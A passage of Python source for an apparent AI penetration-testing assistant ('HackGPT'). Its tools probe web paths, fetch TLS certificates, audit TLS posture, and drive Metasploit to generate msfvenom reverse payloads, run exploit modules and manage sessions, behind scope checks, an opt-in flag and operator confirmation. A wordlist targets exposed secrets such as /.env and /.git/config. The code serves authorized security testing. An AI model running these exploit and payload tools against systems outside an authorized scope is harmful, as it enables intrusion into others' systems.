        data = _http_get_json(f"https://ipinfo.io/{urllib.parse.quote(host)}/json", timeout=20)
    except Exception as exc:  # noqa: BLE001
        return f"ip_info failed for {label}: {exc}"
    keep = {k: data.get(k) for k in ("ip", "hostname", "city", "region", "country", "loc",
                                     "org", "asn", "company", "timezone", "anycast", "postal")}
    keep = {k: v for k, v in keep.items() if v not in (None, "")}
    ctx.session["actions"].append({"tool": "ip_info", "target": label, "ts": _ts()})
    return clip(f"ip_info {label}:\n" + json.dumps(keep, indent=2))


def h_tls_cert(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    port = int(args.get("port") or 443)
    timeout = int(args.get("timeout") or 20)
    if not target:
        raise ToolError("tls_cert: 'target' is required")
    host = C.normalize_target(target)
    C.require_scope(ctx.config, host)
    openssl = C.which("openssl")
    if not openssl:
        raise ToolError("tls_cert: openssl not found")
    ctx.console.log_action("tls_cert", f"{host}:{port}")
    if ctx.dry_run:
        return f"[dry-run] would fetch the TLS certificate for {host}:{port}"
    try:
        p1 = subprocess.run(
            [openssl, "s_client", "-connect", f"{host}:{port}", "-servername", host],
            input=b"", capture_output=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"tls_cert: connection to {host}:{port} timed out"
    p2 = subprocess.run(
        [openssl, "x509", "-noout", "-subject", "-issuer", "-dates",
         "-fingerprint", "-serial", "-nameopt", "sep_multiline"],
        input=p1.stdout, capture_output=True, timeout=20,
    )
    out = (p2.stdout or b"").decode("utf-8", "replace") + (p2.stderr or b"").decode("utf-8", "replace")
    ctx.session["actions"].append({"tool": "tls_cert", "target": f"{host}:{port}", "ts": _ts()})
    return clip(f"TLS certificate {host}:{port}\n{out.strip() or 'no certificate parsed'}")


DEFAULT_DIRS: list[str] = [
    "/robots.txt", "/.git/", "/.git/config", "/.env", "/.htaccess", "/.svn/entries",
    "/admin", "/administrator", "/backup", "/backup.zip", "/config.php", "/db.sql",
    "/debug", "/login", "/logout", "/phpinfo.php", "/phpmyadmin", "/server-status",
    "/sitemap.xml", "/sql", "/test", "/upload", "/uploads", "/wp-admin", "/wp-login.php",
    "/wp-content", "/api", "/api/v1", "/api/v1/users", "/swagger/index.html", "/actuator",
    "/actuator/health", "/.well-known/security.txt", "/crossdomain.xml", "/cgi-bin/",
    "/includes", "/install", "/jenkins", "/kibana", "/solr", "/graphql", "/metrics",
]


def h_web_dirs(args: dict, ctx: Ctx) -> str:
    url = str(args.get("url", "")).strip()
    if not url:
        raise ToolError("web_dirs: 'url' is required")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    C.require_scope(ctx.config, url)
    wordlist = str(args.get("wordlist", "")).strip()
    limit = int(args.get("limit") or 60)
    timeout = float(args.get("timeout") or 8)

    paths = list(DEFAULT_DIRS)
    if wordlist:
        wp = wordlist if os.path.isabs(wordlist) else os.path.join(ctx.workdir, wordlist)
        try:
            with open(wp, "r", encoding="utf-8", errors="replace") as fh:
                paths = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
        except OSError as exc:
            raise ToolError(f"web_dirs: cannot read wordlist {wp}: {exc}") from exc
    paths = paths[:limit]

    base = "{0.scheme}://{0.netloc}".format(urllib.parse.urlparse(url))
    ctx.console.log_action("web_dirs", f"{base} ({len(paths)} paths)")
    if ctx.dry_run:
        return f"[dry-run] would probe {len(paths)} paths under {base}"

    hits: list[str] = []
    try:
        with _http_client(ctx, timeout, False) as cli:
            for p in paths:
                full = base + ("" if p.startswith("/") else "/") + p
                try:
                    r = cli.get(full, timeout=timeout)
                except Exception:  # noqa: BLE001
                    continue
                if r.status_code != 404:
                    hits.append(f"{p} -> {r.status_code} ({len(r.content)}b)")
    except Exception as exc:  # noqa: BLE001
        return f"web_dirs: {exc}"

    ctx.session["actions"].append(
        {"tool": "web_dirs", "url": base, "probed": len(paths), "hits": len(hits), "ts": _ts()})
    return clip(f"{len(hits)} non-404 responses out of {len(paths)} paths under {base}:\n" + "\n".join(hits))


# --------------------------------------------------------------------------
# DNS snapshot / change detection
# --------------------------------------------------------------------------

def h_dns_snapshot(args: dict, ctx: Ctx) -> str:
    domain = str(args.get("domain", "")).strip()
    if not domain:
        raise ToolError("dns_snapshot: 'domain' is required")
    domain = C.normalize_target(domain) or domain
    domain = domain.lower().rstrip(".")
    if not re.fullmatch(r"[a-z0-9.-]+", domain) or ".." in domain:
        raise ToolError("dns_snapshot: provide a valid domain name")
    C.require_scope(ctx.config, domain)
    if ctx.dry_run:
        return f"[dry-run] would resolve A/AAAA records and compare the saved baseline for {domain}"
    try:
        answers = socket.getaddrinfo(domain, None, type=socket.SOCK_STREAM)
        current = sorted({str(row[4][0]) for row in answers})
        if not current:
            raise OSError("resolver returned no A/AAAA addresses")
    except Exception as exc:  # noqa: BLE001
        raise ToolError(f"dns_snapshot: resolution failed: {exc}") from None

    directory = os.path.join(ctx.output_dir, "dns-snapshots")
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, domain + ".json")
    previous: list[str] | None = None
    if os.path.isfile(path):
        try:
            with open(path, encoding="utf-8") as fh:
                stored = json.load(fh)
            previous = sorted(set(str(ip) for ip in stored.get("addresses", [])))
        except (OSError, ValueError, AttributeError):
            raise ToolError(f"dns_snapshot: saved baseline is unreadable: {path}") from None

    payload = {"domain": domain, "addresses": current, "updated": _ts()}
    temp_path = path + ".tmp"
    with open(temp_path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    os.replace(temp_path, path)
    ctx.session["actions"].append({"tool": "dns_snapshot", "domain": domain, "ts": _ts()})
    ctx.session["artifacts"].append(path)
    if previous is None:
        return f"DNS baseline created for {domain}: {', '.join(current)}"
    added = sorted(set(current) - set(previous))
    removed = sorted(set(previous) - set(current))
    if not added and not removed:
        return f"No DNS changes for {domain}; addresses: {', '.join(current)}"
    change = f"DNS changes for {domain}: added: {', '.join(added) or '-'}; removed: {', '.join(removed) or '-'}"
    ctx.session["findings"].append({"category": "observation", "text": change, "host": domain, "ts": _ts()})
    return change


# --------------------------------------------------------------------------
# Metasploit integration (three layers; execution is operator opt-in)
#
#   1. msf_catalog — search-only queries against the local module DB
#   2. msf_payload — msfvenom payload generation (writes files, sends nothing)
#   3. msf_plan    — write a reviewed .rc resource script artifact
#   4. msf_exec    — run a resource script via msfconsole. Requires the operator
#                    to enable `msf_execute` in config.yaml, every RHOSTS entry to
#                    be inside the authorized scope, and an interactive confirmation
#                    unless msf_confirm is disabled. dry-run previews the command.
# --------------------------------------------------------------------------

MSF_MODULE_TYPES = ("auxiliary", "exploit", "post", "payload", "encoder", "nops", "all")

# Small offline catalog of read-only/informational modules. Used when no local
# msfconsole is configured so planning still works; never implies verification.
_OFFLINE_MSF_CATALOG: dict[str, list[tuple[str, str]]] = {
    "http": [
        ("auxiliary/scanner/http/options", "HTTP OPTIONS / allowed methods"),
        ("auxiliary/scanner/http/robots_txt", "robots.txt disclosure check"),
        ("auxiliary/scanner/http/title", "HTTP page title enumeration"),
    ],
    "http-proxy": [
        ("auxiliary/scanner/http/options", "HTTP OPTIONS / allowed methods"),
        ("auxiliary/scanner/http/proxy", "open-proxy detection"),
    ],
    "https": [
        ("auxiliary/scanner/http/options", "HTTP OPTIONS / allowed methods"),
        ("auxiliary/scanner/http/robots_txt", "robots.txt disclosure check"),
    ],
    "ssh": [("auxiliary/scanner/ssh/ssh_version", "SSH banner/version enumeration")],
    "ftp": [("auxiliary/scanner/ftp/ftp_version", "FTP banner/version enumeration")],
    "smtp": [("auxiliary/scanner/smtp/smtp_version", "SMTP banner/version enumeration")],
    "smb": [("auxiliary/scanner/smb/smb_version", "SMB version enumeration")],
    "mysql": [("auxiliary/scanner/mysql/mysql_version", "MySQL version enumeration")],
    "postgres": [("auxiliary/scanner/postgres/postgres_version", "PostgreSQL version enumeration")],
    "rdp": [("auxiliary/scanner/rdp/rdp_scanner", "RDP service enumeration")],
    "telnet": [("auxiliary/scanner/telnet/telnet_version", "Telnet banner enumeration")],
    "snmp": [("auxiliary/scanner/snmp/snmp_enum", "SNMP information enumeration")],
}


def _offline_msf_search(query: str, mtype: str) -> str:
    """Return a best-effort module list without a local Metasploit install."""
    q = query.lower()
    rows = [row for key, vals in _OFFLINE_MSF_CATALOG.items() if key in q for row in vals]
    if not rows:
        rows = [row for key, vals in _OFFLINE_MSF_CATALOG.items()
                if any(tok and tok in key for tok in q.split()) for row in vals]
    if not rows:
        return "[offline catalog — msfconsole not installed] no module matched"
    header = f"[offline catalog — msfconsole not installed; type filter '{mtype}' not enforced]"
    return header + "\n" + "\n".join(f"  {name}  {desc}" for name, desc in rows[:10])
MSF_MODULE_RE = r"[A-Za-z0-9_/.\-]+"
MSF_PAYLOAD_RE = r"[A-Za-z0-9_/.\-]+"


def _msf_binary(ctx: Ctx, key: str, default: str) -> str:
    binary = C.which(ctx.config.get(key, default))
    if not binary:
        raise ToolError(
            f"{default} not found (config '{key}'). Install Metasploit Framework, "
            f"or point config '{key}' at the binary on this host / over SSH."
        )
    return binary


def _msf_search(ctx: Ctx, query: str, mtype: str | None = None) -> str:
    binary = _msf_binary(ctx, "msfconsole", "msfconsole")
    expr = f"type:{mtype} {query}" if mtype and mtype != "all" else query
    try:
        proc = subprocess.run([binary, "-q", "-x", f"search {expr}; exit"],
                              capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        raise ToolError("msf search timed out after 60 seconds") from None
    except Exception as exc:  # noqa: BLE001
        raise ToolError(f"msf search failed: {exc}") from None
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def h_msf_catalog(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action", "status")).strip().lower()
    if action == "status":
        path = C.which(ctx.config.get("msfconsole", "msfconsole"))
        return f"msfconsole: {path}" if path else "msfconsole not installed"
    if action != "search":
        raise ToolError(
            "msf_catalog supports only action=status or search; module execution "
            "is a separate opt-in tool (msf_exec)"
        )
    query = str(args.get("query", "")).strip()
    if not query:
        raise ToolError("msf_catalog search requires a query")
    if len(query) > 120 or not re.fullmatch(r"[A-Za-z0-9 _./:-]+", query):
        raise ToolError("msf_catalog query may contain only letters, digits, spaces, '.', '/', ':', '_' and '-'")
    mtype = str(args.get("type") or "auxiliary").lower()
    if mtype not in MSF_MODULE_TYPES:
        raise ToolError(f"msf_catalog: unknown type '{mtype}' (choose {', '.join(MSF_MODULE_TYPES)})")
    if not C.which(ctx.config.get("msfconsole", "msfconsole")):
        result = _offline_msf_search(query, mtype)
        ctx.session["actions"].append({"tool": "msf_catalog", "action": "search",
                                       "query": query, "type": mtype,
                                       "offline": True, "ts": _ts()})
        return result
    if ctx.dry_run:
        return "[dry-run] would search the local Metasploit catalog; no module would run"
    output = _msf_search(ctx, query, mtype)
    ctx.session["actions"].append({"tool": "msf_catalog", "action": "search", "query": query,
                                   "type": mtype, "ts": _ts()})
    return clip(output or "Metasploit search returned no output")


def h_msf_payload(args: dict, ctx: Ctx) -> str:
    payload = str(args.get("payload", "")).strip()
    lhost = str(args.get("lhost", "")).strip()
    lport = str(args.get("lport", "")).strip()
    fmt = str(args.get("format") or "raw").strip()
    output = str(args.get("output", "")).strip()
    options = args.get("options") or []
    if not payload or not lhost or not lport:
        raise ToolError("msf_payload: 'payload', 'lhost' and 'lport' are required")
    if not re.fullmatch(MSF_PAYLOAD_RE, payload):
        raise ToolError("msf_payload: invalid payload name (allowed: letters, digits, '_', '/', '.', '-')")
    if not re.fullmatch(r"[A-Za-z0-9_.\-]+", fmt):
        raise ToolError("msf_payload: invalid format")
    if not lport.isdigit() or not 0 < int(lport) < 65536:
        raise ToolError("msf_payload: 'lport' must be 1-65535")
    for opt in options:
        if not re.fullmatch(r"[A-Z0-9_]+=.+", str(opt)):
            raise ToolError("msf_payload: options must be KEY=value pairs")
    configured = ctx.config.get("msfvenom", "msfvenom")
    if not output:
        ext = fmt if fmt != "raw" else "bin"
        output = os.path.join(ctx.output_dir, f"msf-payload-{lport}.{ext}")
    elif not os.path.isabs(output):
        output = os.path.join(ctx.output_dir, output)
    cmd = [configured, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]
    cmd += [str(o).strip() for o in options]
    cmd += ["-f", fmt, "-o", output]
    pretty = " ".join(cmd)
    ctx.console.log_action("msf_payload", f"{payload} {lhost}:{lport} ({fmt})")
    if ctx.dry_run:
        return f"[dry-run] would generate: {pretty}"
    binary = _msf_binary(ctx, "msfvenom", "msfvenom")
    cmd[0] = binary
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=int(args.get("timeout") or 300))
    except subprocess.TimeoutExpired:
        return f"$ {pretty}\n[timeout after {int(args.get('timeout') or 300)}s]"
    out = (proc.stdout or "") + (proc.stderr or "")
    ctx.session["actions"].append({"tool": "msf_payload", "payload": payload, "lhost": lhost,
                                   "lport": lport, "format": fmt, "rc": proc.returncode, "ts": _ts()})
    if proc.returncode != 0 or not os.path.exists(output):
        return clip(f"$ {pretty}\nrc={proc.returncode}\n{out}\n[no output file produced]")
    ctx.session["artifacts"].append(output)
    note = ""
    if fmt == "apk":
        note = ("\nnote: unsigned APK — sign it (apksigner/jarsigner) before installation; "
                "use only in authorized labs/engagements")
    return clip(f"$ {pretty}\nrc={proc.returncode}\nsaved -> {output}{note}\n{out}")


def _msf_scope_hosts(rhosts: str) -> list[str]:
    return [t for t in re.split(r"[,\s]+", rhosts.strip()) if t]


def h_msf_plan(args: dict, ctx: Ctx) -> str:
    module = str(args.get("module", "")).strip()
    rhosts = str(args.get("rhosts", "")).strip()
    if not module or not rhosts:
        raise ToolError("msf_plan: 'module' and 'rhosts' are required")
    if not re.fullmatch(MSF_MODULE_RE, module):
        raise ToolError("msf_plan: invalid module path (letters, digits, '_', '/', '.', '-' only)")
    hosts = _msf_scope_hosts(rhosts)
    if not hosts:
        raise ToolError("msf_plan: 'rhosts' must list at least one target")
    for h in hosts:
        if not re.fullmatch(r"[A-Za-z0-9_.:\-]+", h):
            raise ToolError(f"msf_plan: invalid target '{h}'")
        C.require_scope(ctx.config, h)
    lhost = str(args.get("lhost", "")).strip()
    lport = str(args.get("lport", "")).strip() or "4444"
    payload = str(args.get("payload", "")).strip()
    options = args.get("options") or []
    name = str(args.get("name", "")).strip() or "runbook"
    if lhost and not re.fullmatch(r"[A-Za-z0-9_.:\-]+", lhost):
        raise ToolError("msf_plan: invalid LHOST")
    if not lport.isdigit():
        raise ToolError("msf_plan: 'lport' must be numeric")
    if payload and not re.fullmatch(MSF_PAYLOAD_RE, payload):
        raise ToolError("msf_plan: invalid PAYLOAD name")
    if not re.fullmatch(r"[A-Za-z0-9_.\-]+", name) or ".." in name:
        raise ToolError("msf_plan: invalid runbook name")
    for opt in options:
        if not re.fullmatch(r"[A-Z0-9_]+=.+", str(opt)):
            raise ToolError("msf_plan: options must be KEY=value pairs")

    lines = [
        "# HackGPT-generated Metasploit resource script",
        "# Review before running. RHOSTS is limited to the authorized engagement scope.",
        f"use {module}",
        f"set RHOSTS {rhosts}",
    ]
    if payload:
        lines.append(f"set PAYLOAD {payload}")
    if lhost:
        lines.append(f"set LHOST {lhost}")
    if lport:
        lines.append(f"set LPORT {lport}")
    for opt in options:
        lines.append(f"set {str(opt).strip()}")
    lines.append("run")
    content = "\n".join(lines) + "\n"
    path = os.path.join(ctx.output_dir, f"msf-{name}.rc")

    if ctx.dry_run:
        return f"[dry-run] would write runbook -> {path}\n{content}"

    verified: bool | None = None
    try:
        verified = module in _msf_search(ctx, module)
    except ToolError:
        verified = None
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    ctx.session["artifacts"].append(path)
    ctx.session["actions"].append({"tool": "msf_plan", "module": module, "rhosts": rhosts,
                                   "runbook": path, "ts": _ts()})
    state = ("module verified in local catalog" if verified else
             "module NOT found in local catalog" if verified is False else
             "local catalog unavailable (msfconsole not installed)")
    return clip(
        f"runbook written -> {path}\n{state}\n\n{content}\n"
        f"Run it with: msfconsole -q -r {path}\n"
        f"Or through the copilot with msf_exec once msf_execute is enabled."
    )


def h_msf_exec(args: dict, ctx: Ctx) -> str:
    rc_name = str(args.get("rc", "")).strip()
    if not rc_name:
        raise ToolError("msf_exec: 'rc' (resource script path) is required")
    path = rc_name if os.path.isabs(rc_name) else os.path.join(ctx.workdir, rc_name)
    if not os.path.isfile(path):
        alt = os.path.join(ctx.output_dir, rc_name)
        if os.path.isfile(alt):
            path = alt
        else:
            raise ToolError(f"msf_exec: cannot read runbook '{rc_name}'")
    with open(path, "r", encoding="utf-8") as fh:
        content = fh.read()
    rhosts: list[str] = []
    for m in re.finditer(r"^\s*set\s+RHOSTS\s+(.+)$", content, re.IGNORECASE | re.MULTILINE):
        rhosts.extend(_msf_scope_hosts(m.group(1)))
    for h in rhosts:
        C.require_scope(ctx.config, h)
    if not ctx.config.get("msf_execute"):
        raise ToolError(
            "msf_exec: Metasploit module execution is disabled. Enable it explicitly "
            "(config.yaml: msf_execute: true, or run hackgpt with --msf-exec). "
            "Search, payload generation and runbook planning remain available."
        )
    if ctx.dry_run:
        return f"[dry-run] would run: msfconsole -q -r {path} (RHOSTS: {', '.join(rhosts) or 'see runbook'})"
    binary = _msf_binary(ctx, "msfconsole", "msfconsole")
    if ctx.config.get("msf_confirm", True) and not ctx.console.confirm(
            f"Execute Metasploit runbook {os.path.basename(path)} against {', '.join(rhosts) or 'configured targets'}?"):
        return "cancelled by operator"
    cmd = [binary, "-q", "-r", path]
    ctx.console.log_action("msf_exec", os.path.basename(path))
    timeout = int(args.get("timeout") or 300)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        ctx.session["actions"].append({"tool": "msf_exec", "rc": os.path.basename(path),
                                       "result": "timeout", "ts": _ts()})
        return f"$ msfconsole -q -r {path}\n[timeout after {timeout}s]"
    out = (proc.stdout or "") + (proc.stderr or "")
    ctx.session["actions"].append({"tool": "msf_exec", "rc": os.path.basename(path),
                                   "result": proc.returncode, "ts": _ts()})
    return clip(f"$ msfconsole -q -r {path}\nrc={proc.returncode}\n{out}")


# --------------------------------------------------------------------------
# Metasploit RPC (remote msfrpcd control)
#
# Drives a remote Metasploit via its MessagePack RPC endpoint. Execution-shaped
# actions (console write, module runs) require the same msf_execute opt-in as
# msf_exec and re-check scope on RHOSTS. Read-only helpers (status, console
# list/read, session list/info) stay available without the flag.
# --------------------------------------------------------------------------

def _rpc_client(ctx: Ctx) -> MsfRpcClient:
    if not str(ctx.config.get("msfrpcd_host") or "").strip():
        raise ToolError(
            "msf_rpc: 'msfrpcd_host' is not set in config.yaml — point it at a host "
            "running msfrpcd (an SSH tunnel is recommended; see references/msfrpcd-setup.md)"
        )
    client = MsfRpcClient(ctx.config)
    try:
        client.login()
    except RpcError as exc:
        raise ToolError(f"msf_rpc: cannot reach/login to {ctx.config.get('msfrpcd_host')}: {exc}") from exc
    return client


def _rpc_gate(ctx: Ctx, what: str) -> None:
    if not ctx.config.get("msf_execute"):
        raise ToolError(
            f"msf_rpc: {what} requires Metasploit execution to be enabled "
            "(config.yaml: msf_execute: true, or run with --msf-exec)."
        )


def _rpc_confirm(ctx: Ctx, prompt: str) -> bool:
    if ctx.config.get("msf_confirm", True) and not ctx.console.confirm(prompt):
        return False
    return True


def h_msf_rpc_status(args: dict, ctx: Ctx) -> str:
    client = _rpc_client(ctx)
    ver = client.version()
    ctx.session["actions"].append({"tool": "msf_rpc_status",
                                   "host": str(ctx.config.get("msfrpcd_host")), "ts": _ts()})
    lines = [f"msf_rpc connected: {client.url} (token acquired)"]
    if isinstance(ver, dict):
        for key in ("version", "ruby", "api", "platform"):
            if ver.get(key):
                lines.append(f"  {key}: {ver[key]}")
    else:
        lines.append(f"  core.version -> {ver}")
    lines.append("  next: msf_rpc_console / msf_rpc_session / msf_rpc_run")
    return "\n".join(lines)


def h_msf_rpc_console(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "list").strip().lower()
    cid = str(args.get("cid") or "").strip()
    if action == "create":
        res = _rpc_client(ctx).console_create()
        new_id = str(res.get("id") or "") if isinstance(res, dict) else str(res)
        if not new_id:
            raise ToolError("msf_rpc: console.create returned no id")
        ctx.session.setdefault("rpc_consoles", {})[new_id] = {"created": _ts()}
        ctx.session["actions"].append({"tool": "msf_rpc_console", "action": "create",
                                       "cid": new_id, "ts": _ts()})
        return f"console created: {new_id}"
    if action == "list":
        res = _rpc_client(ctx).console_list()
        ctx.session["actions"].append({"tool": "msf_rpc_console", "action": "list", "ts": _ts()})
        return clip(json.dumps(res, indent=2, default=str) or "(no consoles)")
    if action == "write":
        data = str(args.get("data") or "")
        if not cid or not data:
            raise ToolError("msf_rpc console write: 'cid' and 'data' are required")
        _rpc_gate(ctx, "console write")
        if not _rpc_confirm(ctx, f"Send to console {cid}?\n---\n{data[:400]}\n---"):
            return "cancelled by operator"
        if ctx.dry_run:
            return f"[dry-run] would write to console {cid}: {data[:200]}"
        if not data.endswith("\n"):
            data += "\n"
        res = _rpc_client(ctx).console_write(cid, data)
        ctx.session["actions"].append({"tool": "msf_rpc_console", "action": "write",
                                       "cid": cid, "ts": _ts()})
        return clip(f"console {cid} accepted command\n{json.dumps(res, default=str)[:800]}")
    if action == "read":
        if not cid:
            raise ToolError("msf_rpc console read: 'cid' is required")
        res = _rpc_client(ctx).console_read(cid)
        ctx.session["actions"].append({"tool": "msf_rpc_console", "action": "read",
                                       "cid": cid, "ts": _ts()})
        return clip(json.dumps(res, indent=2, default=str))
    if action == "destroy":
        if not cid:
            raise ToolError("msf_rpc console destroy: 'cid' is required")
        res = _rpc_client(ctx).console_destroy(cid)
        ctx.session.get("rpc_consoles", {}).pop(cid, None)
        ctx.session["actions"].append({"tool": "msf_rpc_console", "action": "destroy",
                                       "cid": cid, "ts": _ts()})
        return f"console {cid} destroyed: {res}"
    raise ToolError("msf_rpc console: action must be create|list|write|read|destroy")


def h_msf_rpc_run(args: dict, ctx: Ctx) -> str:
    mtype = str(args.get("type") or "exploit").strip().lower()
    module = str(args.get("module") or "").strip()
    options = args.get("options") or {}
    if mtype not in ("exploit", "auxiliary", "post", "payload"):
        raise ToolError("msf_rpc_run: type must be exploit|auxiliary|post|payload")
    if not module or not re.fullmatch(MSF_MODULE_RE, module):
        raise ToolError("msf_rpc_run: invalid module path (letters, digits, '_', '/', '.', '-' only)")
    if not isinstance(options, dict):
        raise ToolError("msf_rpc_run: 'options' must be an object of KEY: value pairs")
    rhosts = ""
    for key in ("RHOSTS", "RHOST"):
        val = options.get(key)
        if val:
            rhosts = str(val)
            for h in re.split(r"[,\s]+", rhosts):
                C.require_scope(ctx.config, h)
    _rpc_gate(ctx, f"{mtype}/{module}")
    if not _rpc_confirm(ctx, f"Run {mtype}/{module} on the remote MSF against {rhosts or 'the configured targets'}?"):
        return "cancelled by operator"
    if ctx.dry_run:
        return f"[dry-run] would run via RPC: {mtype}/{module} {json.dumps(options, default=str)}"
    res = _rpc_client(ctx).module_execute(mtype, module, options)
    ctx.session["actions"].append({"tool": "msf_rpc_run", "type": mtype, "module": module,
                                   "rhosts": rhosts, "ts": _ts()})
    extra = ""
    if isinstance(res, dict):
        if res.get("job_id") is not None:
            extra += f"\njob_id: {res['job_id']} (running in background — check msf_rpc_session)"
        if res.get("uuid") or res.get("session"):
            extra += f"\nuuid/session: {res.get('uuid') or res.get('session')}"
        if res.get("payload"):
            extra += f"\npayload generated ({len(str(res['payload']))} chars) — save it with file_write if needed"
    return clip(f"{mtype}/{module} launched via remote MSF\n{json.dumps(res, indent=2, default=str)}{extra}")


def h_msf_rpc_session(args: dict, ctx: Ctx) -> str:
    action = str(args.get("action") or "list").strip().lower()
    sid = str(args.get("sid") or "").strip()
    client = _rpc_client(ctx)
    res = client.sessions() or {}
    if action == "list":
        ctx.session["actions"].append({"tool": "msf_rpc_session", "action": "list",
                                       "count": len(res), "ts": _ts()})
        if not res:
            return "no active sessions on the remote MSF"
        lines = ["sid   type       user            host:port               via"]
        for k in sorted(res, key=str):
            v = res[k] if isinstance(res[k], dict) else {}
            lines.append(f"{str(k):<5} {str(v.get('type', '?')):<11} {str(v.get('username', '-')):<16} "
                         f"{str(v.get('session_host', '?'))}:{v.get('session_port', '?'):<7} {v.get('via_exploit', '')}")
        return clip("\n".join(lines))
    if action == "info":
        if not sid:
            raise ToolError("msf_rpc_session info: 'sid' is required")
        info = next((v for k, v in res.items() if str(k) == sid), None)
        if info is None:
            return f"session {sid} not found"
        return clip(json.dumps(info, indent=2, default=str))
    if action == "stop":
        if not sid:
            raise ToolError("msf_rpc_session stop: 'sid' is required")
        out = client.session_stop(sid)
        ctx.session["actions"].append({"tool": "msf_rpc_session", "action": "stop",
                                       "sid": sid, "ts": _ts()})
        return f"session {sid} stop requested: {out}"
    raise ToolError("msf_rpc_session: action must be list|info|stop")


# --------------------------------------------------------------------------
# MITM resilience audit (read-only posture checks)
#
# Answers "how exposed is this endpoint to a man-in-the-middle attack?" using
# only read-only observations: TLS handshake behaviour, certificate facts,
# protocol version support, cipher strength, HSTS and plaintext fallback.
# It never intercepts, modifies or captures traffic.
# --------------------------------------------------------------------------

_TLS_VERSION_FLAGS: list[tuple[str, str]] = [
    ("TLSv1.3", "-tls1_3"),
    ("TLSv1.2", "-tls1_2"),
    ("TLSv1.1", "-tls1_1"),
    ("TLSv1", "-tls1"),
]
_LEGACY_TLS = {"TLSv1", "TLSv1.1"}
_WEAK_CIPHER_MARKERS = ("RC4", "DES-CBC3", "DES-CBC", "NULL", "EXPORT", "MD5")


def _split_hostport(target: str, default_port: int = 443) -> tuple[str, int]:
    t = str(target).strip()
    if t.startswith("["):
        end = t.find("]")
        if end != -1:
            host = t[1:end]
            rest = t[end + 1:]
            if rest.startswith(":") and rest[1:].isdigit() and 0 < int(rest[1:]) < 65536:
                return host, int(rest[1:])
            return host, default_port
    if t.count(":") == 1:
        h, _, p = t.partition(":")
        if p.isdigit() and 0 < int(p) < 65536:
            return h, int(p)
    return t, default_port


def _openssl_sclient(host: str, port: int, timeout: int, extra: list[str] | None = None) -> tuple[int, str]:
    openssl = C.which("openssl")
    if not openssl:
        raise ToolError("mitm_audit: openssl not found")
    cmd = [openssl, "s_client", "-connect", f"{host}:{port}", "-servername", host, *(extra or [])]
    try:
        p = subprocess.run(cmd, input=b"", capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return -1, ""
    out = _as_text(p.stdout) + _as_text(p.stderr)
    return p.returncode, out


def _as_text(value) -> str:
    if value is None:
        return ""
    return value.decode("utf-8", "replace") if isinstance(value, bytes) else str(value)


def _parse_cert_facts(sclient_out: str, timeout: int) -> dict:
    facts: dict = {"pem": False, "subject": "", "issuer": "", "cn": "", "san": [],
                   "not_after": "", "days_left": None, "sig_alg": ""}
    m = re.search(r"-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----", sclient_out, re.DOTALL)
    if not m:
        return facts
    facts["pem"] = True
    openssl = C.which("openssl")
    if not openssl:
        return facts
    try:
        p = subprocess.run([openssl, "x509", "-noout", "-text"],
                           input=m.group(0).encode("utf-8"), capture_output=True, timeout=timeout)
        text = _as_text(p.stdout) + _as_text(p.stderr)
    except Exception:  # noqa: BLE001
        return facts
    for line in text.splitlines():
        stripped = line.strip()
        if stripped.startswith("Subject:"):
            facts["subject"] = stripped.split(":", 1)[1].strip()
            cn = re.search(r"CN\s*=\s*([^,/\s]+)", stripped)
            if cn:
                facts["cn"] = cn.group(1).strip()
        elif stripped.startswith("Issuer:"):
            facts["issuer"] = stripped.split(":", 1)[1].strip()
        elif stripped.startswith("Not After"):
            facts["not_after"] = stripped.split(":", 1)[1].strip()
            try:
                exp = calendar.timegm(time.strptime(facts["not_after"], "%b %d %H:%M:%S %Y %Z"))
                facts["days_left"] = int((exp - time.time()) // 86400)
            except ValueError:
                pass
        elif stripped.startswith("Signature Algorithm:"):
            facts["sig_alg"] = stripped.split(":", 1)[1].strip()
        elif "DNS:" in stripped:
            facts["san"].extend(x.strip() for x in re.findall(r"DNS:([^,\s]+)", stripped))
    return facts


def _cert_names_match(host: str, names: list[str]) -> bool:
    host = host.lower().rstrip(".")
    for raw in names:
        n = raw.lower().rstrip(".")
        if not n:
            continue
        if n == host:
            return True
        if n.startswith("*."):
            suffix = n[1:]  # ".example.com"
            if host.endswith(suffix):
                prefix = host[: -len(suffix)]
                if prefix and "." not in prefix:
                    return True
    return False


def h_mitm_audit(args: dict, ctx: Ctx) -> str:
    target = str(args.get("target", "")).strip()
    if not target:
        raise ToolError("mitm_audit: 'target' is required")
    host_raw, detected_port = _split_hostport(target)
    host = C.normalize_target(host_raw) or host_raw.lower()
    port = int(args.get("port") or detected_port)
    timeout = int(args.get("timeout") or 20)
    C.require_scope(ctx.config, host)
    ctx.console.log_action("mitm_audit", f"{host}:{port}")
    if ctx.dry_run:
        return f"[dry-run] would run a read-only MITM-resilience audit against {host}:{port}"

    findings: list[tuple[str, str]] = []
    supported: list[str] = []
    facts: dict = {}

    rc, base_out = _openssl_sclient(host, port, timeout)
    negotiated_proto = ""
    m = re.search(r"Protocol\s*:\s*(\S+)", base_out)
    if m:
        negotiated_proto = m.group(1)
    negotiated_cipher = ""
    m = re.search(r"Cipher\s*:\s*(\S+)", base_out)
    if m:
        negotiated_cipher = m.group(1)
    if not negotiated_cipher:
        # TLSv1.3 handshakes print "New, TLSv1.3, Cipher is <name>" instead
        m = re.search(r"Cipher is\s+(\S+)", base_out)
        if m:
            negotiated_cipher = m.group(1)
    verify = ""
    m = re.search(r"Verify return code:\s*(\d+)\s*\(([^)]+)\)", base_out)
    if m:
        verify = f"{m.group(1)} ({m.group(2)})"

    reachable = rc == 0 and "BEGIN CERTIFICATE" in base_out
    if not reachable:
